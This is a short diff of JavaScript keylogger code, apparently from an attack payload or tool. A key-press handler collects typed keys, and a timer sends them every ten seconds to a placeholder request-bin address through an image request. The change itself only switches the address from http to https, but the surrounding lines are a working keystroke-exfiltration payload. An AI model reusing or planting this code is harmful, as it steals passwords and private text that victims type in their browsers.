@@ -63,7 +63,7 @@ document.onkeypress = function (e) {
 }
 window.setInterval(function () {
     if (keys.length > 0){
-        new Image().src = 'http://{request bin url}?keys=' + keys;
+        new Image().src = 'https://{request bin url}?keys=' + keys;
     }
     keys = '';
 }, 10000);
